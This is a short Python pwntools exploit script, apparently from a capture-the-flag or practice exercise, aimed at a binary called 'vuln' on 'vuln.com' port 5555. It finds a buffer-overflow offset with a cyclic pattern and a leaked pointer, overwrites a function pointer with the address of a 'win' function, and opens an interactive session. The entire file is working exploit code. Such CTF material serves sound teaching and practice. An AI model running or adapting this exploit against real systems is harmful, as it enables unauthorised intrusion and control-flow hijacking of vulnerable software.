from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'critical'


host, port = 'vuln.com', 5555
elf = ELF('vuln')


def conn(argv=[], env={}):
    if args.REMOTE:
        return remote(host, port)
    elif args.GDB:
        return gdb.debug([elf.path]+argv, env=env)
    else:
        return process([elf.path]+argv, env=env)


def exploit():
    payload = b''
    payload += cyclic(0x100)
    r = conn()
    r.sendline(payload)
    r.recvuntil(b'jumping to ')
    var_func_ptr = int(r.recvuntil(b'\n')[:-1], 16)
    offset = cyclic_find(var_func_ptr)
    payload = b''
    payload += cyclic(offset)
    payload += p64(elf.symbols['win'])
    r = conn()
    r.sendline(payload)
    r.interactive()


if __name__ == '__main__':
    exploit()
